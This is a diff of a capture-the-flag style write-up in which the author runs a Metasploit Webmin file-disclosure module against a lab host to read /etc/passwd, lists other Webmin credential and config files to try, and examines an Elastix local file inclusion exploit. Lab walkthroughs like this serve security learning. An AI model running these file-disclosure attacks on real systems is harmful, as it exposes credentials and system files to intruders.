@@ -265,39 +265,57 @@ Some errors as we can see. Let's move on first!
 ## 3. Attack Attempt 1: Attacking Port 10000 Webmin
 Let's run this `auxiliary/admin/webmin/file_disclosure` exploit.
 ```
-msf5 > use auxiliary/admin/webmin/file_disclosure
+hippoeug@kali:~$ msfconsole
+msf6 > use auxiliary/admin/webmin/file_disclosure
+msf6 auxiliary(admin/webmin/file_disclosure) > show options
 
-msf5 auxiliary(admin/webmin/file_disclosure) > run
-[*] Running module against 10.10.10.7
+Module options (auxiliary/admin/webmin/file_disclosure):
+
+   Name     Current Setting   Required  Description
+   ----     ---------------   --------  -----------
+   DIR      /unauthenticated  yes       Webmin directory path
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH    /etc/passwd       yes       The file to download
+   RPORT    10000             yes       The target port (TCP)
+   SSL      false             no        Negotiate SSL/TLS for outgoing connections
+   VHOST                      no        HTTP server virtual host
+
+
+Auxiliary action:
+
+   Name      Description
+   ----      -----------
+   Download  Download arbitrary file
+
+
+msf6 auxiliary(admin/webmin/file_disclosure) > set rhosts 10.129.137.135
+rhosts => 10.129.137.135
+msf6 auxiliary(admin/webmin/file_disclosure) > run
+[*] Running module against 10.129.137.135
 
 [*] Attempting to retrieve /etc/passwd...
-[-] Auxiliary failed: Errno::ENOTCONN Transport endpoint is not connected - getpeername(2)
-[-] Call stack:
-[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket.rb:752:in `getpeername'
-[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket.rb:752:in `getpeername_as_array'
-[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket.rb:765:in `peerinfo'
-[-]   /usr/share/metasploit-framework/lib/rex/proto/http/client.rb:640:in `peerinfo'
-[-]   /usr/share/metasploit-framework/lib/rex/proto/http/client.rb:233:in `_send_recv'
-[-]   /usr/share/metasploit-framework/lib/rex/proto/http/client.rb:211:in `send_recv'
-[-]   /usr/share/metasploit-framework/lib/msf/core/exploit/http/client.rb:336:in `send_request_raw'
-[-]   /usr/share/metasploit-framework/modules/auxiliary/admin/webmin/file_disclosure.rb:65:in `run'
+[*] No response from the server
 [*] Auxiliary module execution completed
 ```
 Nope, didn't work. What about doing exploit instead?
 ```
-msf5 auxiliary(admin/webmin/file_disclosure) > exploit
-[*] Running module against 10.10.10.7
+msf6 auxiliary(admin/webmin/file_disclosure) > exploit
+[*] Running module against 10.129.137.135
 
 [*] Attempting to retrieve /etc/passwd...
 [*] The server returned: 200 Bad Request
 <h1>Error - Bad Request</h1>
-<pre>This web server is running in SSL mode. Try the URL <a href='https://10.10.10.7:10000/'>https://10.10.10.7:10000/</a> instead.<br></pre>
+<pre>This web server is running in SSL mode. Try the URL <a href='https://10.129.137.135:10000/'>https://10.129.137.135:10000/</a> instead.<br></pre>
 [*] Auxiliary module execution completed
-
-msf5 auxiliary(admin/webmin/file_disclosure) > set ssl true
-...
-msf5 auxiliary(admin/webmin/file_disclosure) > run
-[*] Running module against 10.10.10.7
+```
+Let's set SSL to true.
+```
+msf6 auxiliary(admin/webmin/file_disclosure) > set ssl true
+[!] Changing the SSL option's value may require changing RPORT!
+ssl => true
+msf6 auxiliary(admin/webmin/file_disclosure) > exploit
+[*] Running module against 10.129.137.135
 
 [*] Attempting to retrieve /etc/passwd...
 [*] The server returned: 404 File not found
@@ -305,7 +323,8 @@ msf5 auxiliary(admin/webmin/file_disclosure) > run
 [*] Auxiliary module execution completed
 ```
 Ah this works, but no file found.
-I've tried finding common files, such as:
+
+I've tried finding other common files, such as:
 ```
 /etc/webmin/miniserv.conf
 /etc/webmin/htusers
@@ -532,7 +551,7 @@ Nothing. Let's focus on Elastix exploits.
 Since we are looking for a Elastix exploit, we try to get the version of Elastix being ran.
 However, neither the landing page nor Gobuster revealed the version of Elastix. Viewing Elastix page source on 443 didn't reveal the version either. Using Burp to intercept a response from Elastix, we still do not find any version numbers. Let's just try using some of the exploits we saw from doing `searchsploit elastix`.
 
-Trying the first one, `Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl`, we examine it first.
+Trying the first interesting one, `Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl`, we examine it first.
 ```
 hippoeug@kali:~$ searchsploit -x 37637.pl
   Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
